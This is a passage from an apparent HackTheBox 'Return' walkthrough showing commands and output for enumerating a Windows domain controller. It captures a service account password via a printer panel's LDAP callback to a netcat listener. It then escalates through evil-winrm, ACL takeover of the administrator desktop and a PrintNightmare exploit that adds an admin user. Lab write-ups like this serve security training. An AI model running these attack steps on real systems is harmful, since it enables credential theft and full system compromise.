</span></span><span class=line><span class=cl>49671/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49673/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49676/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>49688/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>59797/tcp open  msrpc         Microsoft Windows RPC
</span></span><span class=line><span class=cl>Service Info: Host: PRINTER<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: 25m20s
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   2.02: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled and required
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2021-10-15T23:15:10
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: N/A
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 72.44 seconds
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-445---smb>TCP 445 - SMB<a class=anchor aria-hidden=true href=#tcp-445---smb>#</a></h3><p>On SMB, anonymous login is allowed, but there is no share available.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «return» «10.10.14.11» 
</span></span><span class=line><span class=cl>$ smbclient -N -L //10.10.11.108/
</span></span><span class=line><span class=cl>Anonymous login successful
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        Sharename       Type      Comment
</span></span><span class=line><span class=cl>        ---------       ----      -------
</span></span><span class=line><span class=cl>SMB1 disabled -- no workgroup available
</span></span></code></pre></div><p>I tried to enumerate the domain users, but got access denied.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «return» «10.10.14.11» 
</span></span><span class=line><span class=cl>$ rpcclient -U <span class=s1>&#39;%&#39;</span> 10.10.11.108                                                     
</span></span><span class=line><span class=cl>rpcclient $&gt; srvinfo
</span></span><span class=line><span class=cl>Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
</span></span><span class=line><span class=cl>rpcclient $&gt; enumdomusers 
</span></span><span class=line><span class=cl>result was NT_STATUS_ACCESS_DENIED
</span></span></code></pre></div><h3 id=tcp-389---ldap>TCP 389 - LDAP<a class=anchor aria-hidden=true href=#tcp-389---ldap>#</a></h3><p>Without creds, there is no hope here.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «return» «10.10.14.11» 
</span></span><span class=line><span class=cl>$ ldapsearch -LLL -x -h 10.10.11.108 -b <span class=s2>&#34;dc=return,dc=local&#34;</span>
</span></span><span class=line><span class=cl>Operations error <span class=o>(</span>1<span class=o>)</span>
</span></span><span class=line><span class=cl>Additional information: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this operation a successful <span class=nb>bind</span> must be completed on the connection., data 0, v4563
</span></span></code></pre></div><h3 id=tcp-80---printer-panel>TCP 80 - Printer Panel<a class=anchor aria-hidden=true href=#tcp-80---printer-panel>#</a></h3><p>A printer admin panel for managing printer is shown on port 80.</p><p><div class=img-container><img src=imgs/image-20211017015705468.png alt=image-20211017015705468></div></p><p>Under the settings menu, I can see the printer&rsquo;s configuration, which reveals a username and a masked password. This password can&rsquo;t be unmasked by modifying the HTML attribute.</p><p><div class=img-container><img src=imgs/image-20211017015826808.png alt=image-20211017015826808></div></p><p>Clicking on the update button sends out a POST request with parameter <code>ip</code> to Return&rsquo;s IP.</p><p><div class=img-container><img src=imgs/image-20211017023404252.png alt=image-20211017023404252></div></p><p>The key takeaway from this is that I was the one who triggered that request.</p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-svc-printer>Shell as svc-printer<a class=anchor aria-hidden=true href=#shell-as-svc-printer>#</a></h3><h4 id=capturing-password>Capturing Password<a class=anchor aria-hidden=true href=#capturing-password>#</a></h4><p>From the previous enumeration on printer panel, what if I change the server address to my IP and setup a nc listener?.</p><p><div class=img-container><img src=imgs/image-20211017022203702.png alt=image-20211017022203702></div></p><p>The answer is the password pops up on my listener.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «return» «10.10.14.11» 
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>389</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>389</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.11<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.108<span class=o>]</span> <span class=m>50904</span>
</span></span><span class=line><span class=cl>0*<span class=sb>`</span>%return<span class=se>\s</span>vc-printer�
</span></span><span class=line><span class=cl>                       1edFg43012!!
</span></span></code></pre></div><p>CrackMapExec shows that <code>return\svc-printer:1edFg43012!!</code> is a valid credentials.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «return» «10.10.14.11» 
</span></span><span class=line><span class=cl>$ crackmapexec smb 10.10.11.108 -u <span class=s1>&#39;svc-printer&#39;</span> -p <span class=s1>&#39;1edFg43012!!&#39;</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.108    <span class=m>445</span>    PRINTER          <span class=o>[</span>*<span class=o>]</span> Windows 10.0 Build <span class=m>17763</span> x64 <span class=o>(</span>name:PRINTER<span class=o>)</span> <span class=o>(</span>domain:return.local<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span><span class=line><span class=cl>SMB         10.10.11.108    <span class=m>445</span>    PRINTER          <span class=o>[</span>+<span class=o>]</span> <span class=k>return</span>.local<span class=se>\s</span>vc-printer:1edFg43012!! 
</span></span><span class=line><span class=cl>→ kali@kali «return» «10.10.14.11» 
</span></span><span class=line><span class=cl>$ crackmapexec winrm 10.10.11.108 -u <span class=s1>&#39;svc-printer&#39;</span> -p <span class=s1>&#39;1edFg43012!!&#39;</span> 	
</span></span><span class=line><span class=cl>WINRM       10.10.11.108    <span class=m>5985</span>   PRINTER          <span class=o>[</span>*<span class=o>]</span> Windows 10.0 Build <span class=m>17763</span> <span class=o>(</span>name:PRINTER<span class=o>)</span> <span class=o>(</span>domain:return.local<span class=o>)</span>
</span></span><span class=line><span class=cl>WINRM       10.10.11.108    <span class=m>5985</span>   PRINTER          <span class=o>[</span>*<span class=o>]</span> http://10.10.11.108:5985/wsman
</span></span><span class=line><span class=cl>WINRM       10.10.11.108    <span class=m>5985</span>   PRINTER          <span class=o>[</span>+<span class=o>]</span> <span class=k>return</span>.local<span class=se>\s</span>vc-printer:1edFg43012!! <span class=o>(</span>Pwn3d!<span class=o>)</span>
</span></span></code></pre></div><h4 id=winrm---svc-printer>WinRM - svc-printer<a class=anchor aria-hidden=true href=#winrm---svc-printer>#</a></h4><p>I can login via WinRM and grab the flag.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «return» «10.10.14.11» 
</span></span><span class=line><span class=cl>$ evil-winrm -i 10.10.11.108 -u <span class=s1>&#39;svc-printer&#39;</span> -p<span class=s1>&#39;1edFg43012!!&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Evil-WinRM shell v2.4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\D</span>ocuments&gt; 
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\D</span>ocuments&gt; <span class=nb>cd</span> ..<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\D</span>esktop&gt; gci
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                LastWriteTime         Length Name
</span></span><span class=line><span class=cl>----                -------------         ------ ----
</span></span><span class=line><span class=cl>-ar---       10/14/2021  10:33 PM             <span class=m>34</span> user.txt
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\D</span>esktop&gt; gc user.txt 
</span></span><span class=line><span class=cl>48ba9...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><h3 id=administrative-access>Administrative Access<a class=anchor aria-hidden=true href=#administrative-access>#</a></h3><h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4><p>Checking user&rsquo;s privileges with <code>whoami</code> reveals that <code>svc-printer</code> is a member of Server Operators and Print Operators. There are also some access tokens that can be abused.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\D</span>esktop&gt; whoami /all
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>USER INFORMATION
</span></span><span class=line><span class=cl>----------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User Name          <span class=nv>SID</span>
</span></span><span class=line><span class=cl><span class=o>==================</span> <span class=o>=============================================</span>
</span></span><span class=line><span class=cl><span class=k>return</span><span class=se>\s</span>vc-printer S-1-5-21-3750359090-2939318659-876128439-1103
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>GROUP INFORMATION
</span></span><span class=line><span class=cl>-----------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Group Name                                 Type             SID          <span class=nv>Attributes</span>
</span></span><span class=line><span class=cl><span class=o>==========================================</span> <span class=o>================</span> <span class=o>============</span> <span class=o>==================================================</span>
</span></span><span class=line><span class=cl>Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>BUILTIN<span class=se>\S</span>erver Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>BUILTIN<span class=se>\P</span>rint Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>BUILTIN<span class=se>\R</span>emote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>BUILTIN<span class=se>\U</span>sers                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>BUILTIN<span class=se>\P</span>re-Windows <span class=m>2000</span> Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>NT AUTHORITY<span class=se>\N</span>ETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>NT AUTHORITY<span class=se>\A</span>uthenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>NT AUTHORITY<span class=se>\T</span>his Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>NT AUTHORITY<span class=se>\N</span>TLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
</span></span><span class=line><span class=cl>Mandatory Label<span class=se>\H</span>igh Mandatory Level       Label            S-1-16-12288
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PRIVILEGES INFORMATION
</span></span><span class=line><span class=cl>----------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Privilege Name                Description                         <span class=nv>State</span>
</span></span><span class=line><span class=cl><span class=o>=============================</span> <span class=o>===================================</span> <span class=o>=======</span>
</span></span><span class=line><span class=cl>SeMachineAccountPrivilege     Add workstations to domain          Enabled
</span></span><span class=line><span class=cl>SeLoadDriverPrivilege         Load and unload device drivers      Enabled
</span></span><span class=line><span class=cl>SeSystemtimePrivilege         Change the system <span class=nb>time</span>              Enabled
</span></span><span class=line><span class=cl>SeBackupPrivilege             Back up files and directories       Enabled
</span></span><span class=line><span class=cl>SeRestorePrivilege            Restore files and directories       Enabled
</span></span><span class=line><span class=cl>SeShutdownPrivilege           Shut down the system                Enabled
</span></span><span class=line><span class=cl>SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
</span></span><span class=line><span class=cl>SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
</span></span><span class=line><span class=cl>SeIncreaseWorkingSetPrivilege Increase a process working <span class=nb>set</span>      Enabled
</span></span><span class=line><span class=cl>SeTimeZonePrivilege           Change the <span class=nb>time</span> zone                Enabled
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>USER CLAIMS INFORMATION
</span></span><span class=line><span class=cl>-----------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User claims unknown.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Kerberos support <span class=k>for</span> Dynamic Access Control on this device has been disabled.
</span></span></code></pre></div><p>According to this <a href=https://ss64.com/nt/syntax-security_groups.html>site</a>, <strong>Server Operators</strong> is:</p><blockquote><p>A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.</p></blockquote><p>I can say that <strong>Server Operators</strong> is the ultimate version of <strong>Backup Operators</strong>.</p><p>As for Print Operators, I&rsquo;ll remember from HTB: Fuse that it can be exploited by loading a malicious driver using <code>SeLoadDriverPrivilege</code>. I don&rsquo;t demo it here, so see <a href=https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#priv-svc-print--system>this awesome post</a> by 0xdf instead.</p><p>Further enumeration reveals that Print Spooler is running ( ͡° ͜ʖ ͡°).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\D</span>esktop&gt; Get-Service -Name Spooler
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Status   Name               DisplayName
</span></span><span class=line><span class=cl>------   ----               -----------
</span></span><span class=line><span class=cl>Running  Spooler            Print Spooler
</span></span></code></pre></div><h4 id=diskshadow-failed>DiskShadow (failed)<a class=anchor aria-hidden=true href=#diskshadow-failed>#</a></h4><p>The back up and restore files involve two access tokens: <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>. These tokens were previously abused to dump AD database (NTDS.d) in <a href=https://fahmifj.github.io/hackthebox/blackfield/#shell-as-administrator>HTB: Blackfield</a>.</p><p>I tried to reproduce the attack here, but I got the following results.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\c</span>hrp&gt; diskshadow /s script.txt
</span></span><span class=line><span class=cl>Microsoft DiskShadow version 1.0
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>C<span class=o>)</span> <span class=m>2013</span> Microsoft Corporation
</span></span><span class=line><span class=cl>On computer:  PRINTER,  10/16/2021 1:24:40 PM
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-&gt; <span class=nb>set</span> context persistent nowriters
</span></span><span class=line><span class=cl>-&gt; add volume c: <span class=nb>alias</span> iamf
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>COM call <span class=s2>&#34;(*vssObject)-&gt;InitializeForBackup&#34;</span> failed.
</span></span></code></pre></div><p>The intended way, according to the official writeup, is to abuse the <code>Server Operators</code> ability to start/stop/modify services, but I&rsquo;ll put that aside.</p><h4 id=acl-full-access>ACL Full Access<a class=anchor aria-hidden=true href=#acl-full-access>#</a></h4><p>There is another way that still involves the <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code>. It&rsquo;s to modify ACL and grant myself full access to the file/folder I specified using <a href=https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1>this PowerShell script</a>. In the following, I use that script to own the entire admin&rsquo;s desktop folder.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\c</span>hrp&gt;Acl-FullControl -user <span class=k>return</span><span class=se>\s</span>vc-printer -path c:<span class=se>\u</span>sers<span class=se>\a</span>dministrator<span class=se>\d</span>esktop
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Current permissions:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Path   : Microsoft.PowerShell.Core<span class=se>\F</span>ileSystem::C:<span class=se>\u</span>sers<span class=se>\a</span>dministrator<span class=se>\d</span>esktop
</span></span><span class=line><span class=cl>Owner  : BUILTIN<span class=se>\A</span>dministrators
</span></span><span class=line><span class=cl>Group  : RETURN<span class=se>\D</span>omain Users
</span></span><span class=line><span class=cl>Access : NT AUTHORITY<span class=se>\S</span>YSTEM Allow  FullControl
</span></span><span class=line><span class=cl>         BUILTIN<span class=se>\A</span>dministrators Allow  FullControl
</span></span><span class=line><span class=cl>         RETURN<span class=se>\A</span>dministrator Allow  FullControl
</span></span><span class=line><span class=cl>Audit  :
</span></span><span class=line><span class=cl>Sddl   : O:BAG:DUD:<span class=o>(</span>A<span class=p>;</span>OICIID<span class=p>;</span>FA<span class=p>;;;</span>SY<span class=o>)(</span>A<span class=p>;</span>OICIID<span class=p>;</span>FA<span class=p>;;;</span>BA<span class=o>)(</span>A<span class=p>;</span>OICIID<span class=p>;</span>FA<span class=p>;;;</span>LA<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Changing permissions to c:<span class=se>\u</span>sers<span class=se>\a</span>dministrator<span class=se>\d</span>esktop
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Acls changed successfully.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Path   : Microsoft.PowerShell.Core<span class=se>\F</span>ileSystem::C:<span class=se>\u</span>sers<span class=se>\a</span>dministrator<span class=se>\d</span>esktop
</span></span><span class=line><span class=cl>Owner  : BUILTIN<span class=se>\A</span>dministrators
</span></span><span class=line><span class=cl>Group  : RETURN<span class=se>\D</span>omain Users
</span></span><span class=line><span class=cl>Access : RETURN<span class=se>\s</span>vc-printer Allow  FullControl
</span></span><span class=line><span class=cl>         NT AUTHORITY<span class=se>\S</span>YSTEM Allow  FullControl
</span></span><span class=line><span class=cl>         BUILTIN<span class=se>\A</span>dministrators Allow  FullControl
</span></span><span class=line><span class=cl>         RETURN<span class=se>\A</span>dministrator Allow  FullControl
</span></span><span class=line><span class=cl>Audit  :
</span></span><span class=line><span class=cl>Sddl   : O:BAG:DUD:AI<span class=o>(</span>A<span class=p>;</span>OICI<span class=p>;</span>FA<span class=p>;;;</span>S-1-5-21-3750359090-2939318659-876128439-1103<span class=o>)(</span>A<span class=p>;</span>OICIID<span class=p>;</span>FA<span class=p>;;;</span>SY<span class=o>)(</span>A<span class=p>;</span>OICIID<span class=p>;</span>FA<span class=p>;;;</span>BA<span class=o>)(</span>A<span class=p>;</span>OICIID<span class=p>;</span>FA<span class=p>;;;</span>LA<span class=o>)</span>
</span></span></code></pre></div><p>Now I can read the flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\c</span>hrp&gt; <span class=nb>type</span> <span class=se>\u</span>sers<span class=se>\a</span>dministrator<span class=se>\d</span>esktop<span class=se>\r</span>oot.txt
</span></span><span class=line><span class=cl>9f8dd...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><p>I also made the <a href=https://github.com/fahmifj/AAD-scripts/blob/main/Acl-RevokeFullControl.ps1>anti script</a> to revert what I did on the admin&rsquo;s desktop folder.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\c</span>hrp&gt; Acl-RevokeFullControl -User <span class=k>return</span><span class=se>\s</span>vc-printer -Path C:<span class=se>\u</span>sers<span class=se>\a</span>dministrator<span class=se>\d</span>esktop
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Current permissions:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Path   : Microsoft.PowerShell.Core<span class=se>\F</span>ileSystem::C:<span class=se>\u</span>sers<span class=se>\a</span>dministrator<span class=se>\d</span>esktop
</span></span><span class=line><span class=cl>Owner  : BUILTIN<span class=se>\A</span>dministrators
</span></span><span class=line><span class=cl>Group  : RETURN<span class=se>\D</span>omain Users
</span></span><span class=line><span class=cl>Access : RETURN<span class=se>\s</span>vc-printer Allow  FullControl
</span></span><span class=line><span class=cl>         NT AUTHORITY<span class=se>\S</span>YSTEM Allow  FullControl
</span></span><span class=line><span class=cl>         BUILTIN<span class=se>\A</span>dministrators Allow  FullControl
</span></span><span class=line><span class=cl>         RETURN<span class=se>\A</span>dministrator Allow  FullControl
</span></span><span class=line><span class=cl>Audit  :
</span></span><span class=line><span class=cl>Sddl   : O:BAG:DUD:AI<span class=o>(</span>A<span class=p>;</span>OICI<span class=p>;</span>FA<span class=p>;;;</span>S-1-5-21-3750359090-2939318659-876128439-1103<span class=o>)(</span>A<span class=p>;</span>OICIID<span class=p>;</span>FA<span class=p>;;;</span>SY<span class=o>)(</span>A<span class=p>;</span>OICIID<span class=p>;</span>FA<span class=p>;;;</span>BA<span class=o>)(</span>A<span class=p>;</span>OICIID<span class=p>;</span>FA<span class=p>;;;</span>LA<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User permissions to remove on C:<span class=se>\u</span>sers<span class=se>\a</span>dministrator<span class=se>\d</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>FileSystemRights  : FullControl
</span></span><span class=line><span class=cl>AccessControlType : Allow
</span></span><span class=line><span class=cl>IdentityReference : RETURN<span class=se>\s</span>vc-printer
</span></span><span class=line><span class=cl>IsInherited       : False
</span></span><span class=line><span class=cl>InheritanceFlags  : ContainerInherit, ObjectInherit
</span></span><span class=line><span class=cl>PropagationFlags  : None
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Acls changed successfully.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Path   : Microsoft.PowerShell.Core<span class=se>\F</span>ileSystem::C:<span class=se>\u</span>sers<span class=se>\a</span>dministrator<span class=se>\d</span>esktop
</span></span><span class=line><span class=cl>Owner  : BUILTIN<span class=se>\A</span>dministrators
</span></span><span class=line><span class=cl>Group  : RETURN<span class=se>\D</span>omain Users
</span></span><span class=line><span class=cl>Access : NT AUTHORITY<span class=se>\S</span>YSTEM Allow  FullControl
</span></span><span class=line><span class=cl>         BUILTIN<span class=se>\A</span>dministrators Allow  FullControl
</span></span><span class=line><span class=cl>         RETURN<span class=se>\A</span>dministrator Allow  FullControl
</span></span><span class=line><span class=cl>Audit  :
</span></span><span class=line><span class=cl>Sddl   : O:BAG:DUD:AI<span class=o>(</span>A<span class=p>;</span>OICIID<span class=p>;</span>FA<span class=p>;;;</span>SY<span class=o>)(</span>A<span class=p>;</span>OICIID<span class=p>;</span>FA<span class=p>;;;</span>BA<span class=o>)(</span>A<span class=p>;</span>OICIID<span class=p>;</span>FA<span class=p>;;;</span>LA<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\c</span>hrp&gt; gc <span class=se>\\</span>printer<span class=se>\c</span>$<span class=se>\u</span>sers<span class=se>\a</span>dministrator<span class=se>\d</span>esktop<span class=se>\r</span>oot.txt
</span></span><span class=line><span class=cl>Access to the path <span class=s1>&#39;\\printer\c$\users\administrator\desktop\root.txt&#39;</span> is denied.
</span></span><span class=line><span class=cl>At line:1 char:1
</span></span><span class=line><span class=cl>+ gc <span class=se>\\</span>printer<span class=se>\c</span>$<span class=se>\u</span>sers<span class=se>\a</span>dministrator<span class=se>\d</span>esktop<span class=se>\r</span>oot.txt
</span></span><span class=line><span class=cl>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
</span></span><span class=line><span class=cl>    + CategoryInfo          : PermissionDenied: <span class=o>(</span><span class=se>\\</span>printer<span class=se>\c</span>$<span class=se>\u</span>s...esktop<span class=se>\r</span>oot.txt:String<span class=o>)</span> <span class=o>[</span>Get-Content<span class=o>]</span>, UnauthorizedAccessException
</span></span><span class=line><span class=cl>    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
</span></span></code></pre></div><h4 id=alternative--printnightmare-lpe>(Alternative) PrintNightmare LPE<a class=anchor aria-hidden=true href=#alternative--printnightmare-lpe>#</a></h4><p>And here&rsquo;s the ultimate exploit.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\c</span>hrp&gt; Import-Module .<span class=se>\C</span>VE-2021-1675.ps1
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\c</span>hrp&gt; Invoke-Nightmare -NewUser <span class=s2>&#34;choropys&#34;</span> -NewPassword <span class=s2>&#34;ch0ropys!&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> created payload at C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\A</span>ppData<span class=se>\L</span>ocal<span class=se>\T</span>emp<span class=se>\n</span>ightmare.dll
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> using <span class=nv>pDriverPath</span> <span class=o>=</span> <span class=s2>&#34;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\mxdwdrv.dll&#34;</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> added user choropys as <span class=nb>local</span> administrator
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> deleting payload from C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\A</span>ppData<span class=se>\L</span>ocal<span class=se>\T</span>emp<span class=se>\n</span>ightmare.dll
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\c</span>hrp&gt; net user
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>User accounts <span class=k>for</span> <span class=se>\\</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-------------------------------------------------------------------------------
</span></span><span class=line><span class=cl>Administrator            choropys                 Guest
</span></span><span class=line><span class=cl>krbtgt                   svc-printer
</span></span><span class=line><span class=cl>The <span class=nb>command</span> completed with one or more errors.
</span></span></code></pre></div><p>The hard way to read the root flag (afaik this won&rsquo;t work if WinRM disabled).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\c</span>hrp&gt; <span class=nv>$username</span> <span class=o>=</span> <span class=s2>&#34;choropys&#34;</span>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\s</span>vc-printer<span class=se>\c</span>hrp&gt; <span class=nv>$password</span> <span class=o>=</span> ConvertTo-SecureString <span class=s2>&#34;ch0ropys!&#34;</span> -AsPlainText -Force
